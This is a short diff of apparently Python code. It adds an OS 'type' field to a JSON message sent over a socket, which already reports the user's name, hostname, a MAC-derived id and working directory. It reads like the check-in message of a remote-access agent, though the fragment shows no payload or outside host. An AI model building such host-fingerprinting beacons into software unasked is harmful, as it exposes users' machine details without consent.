@@ -17,7 +17,8 @@ sock.send(json.dumps({
 	"username":username,
 	"hostname":socket.gethostname(),
 	"uid": str(get_mac()),
-	"current_directory": os.getcwd()
+	"current_directory": os.getcwd(),
+	"type": "linux"
 }))
 
 
